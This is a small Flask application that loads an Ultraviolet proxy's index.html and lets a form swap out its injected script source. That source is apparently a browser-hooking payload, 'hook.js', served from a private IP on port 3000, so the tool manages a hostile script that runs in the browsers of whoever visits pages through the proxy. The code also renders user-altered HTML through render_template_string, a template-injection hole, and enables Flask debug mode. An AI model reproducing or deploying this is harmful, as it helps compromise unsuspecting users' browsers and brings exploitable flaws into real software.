from flask import Flask, render_template_string, request

app = Flask(__name__)

# Load the content of the HTML file
with open('node_modules/ultraviolet-static/public/index.html', 'r') as file:
    html_content = file.read()

@app.route('/', methods=['GET', 'POST'])
def modify_html():
    if request.method == 'POST':
        new_src = request.form['new_src']
        
        # Replace the existing script src with the new one
        modified_html = html_content.replace(
            'http://10.101.136.96:3000/hook.js', new_src
        )
        return render_template_string(modified_html)

    return '''
        <form method="POST">
            <label for="new_src">Enter new script src:</label><br>
            <input type="text" id="new_src" name="new_src"><br><br>
            <input type="submit" value="Submit">
        </form>
    '''

if __name__ == '__main__':
    app.run(debug=True)
